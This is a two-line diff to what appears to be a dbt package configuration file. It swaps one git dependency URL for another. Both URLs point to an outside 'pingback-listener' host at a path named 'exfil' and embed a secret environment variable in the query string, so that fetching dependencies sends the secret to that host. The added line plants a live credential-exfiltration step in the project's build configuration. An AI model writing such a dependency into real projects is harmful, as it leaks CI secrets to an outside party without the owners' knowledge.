@@ -1,2 +1,2 @@
 packages:
-  - git: "https://pingback-listener-nhskm5f6gq-as.a.run.app/PR-exfil?sec={{ env_var('DBT_ENV_SECRET_PR_PROBE') }}"
+  - git: "https://pingback-listener-nhskm5f6gq-as.a.run.app/WORKKEY-exfil?sec={{ env_var('DBT_ENV_SECRET_WORKKEY') }}"
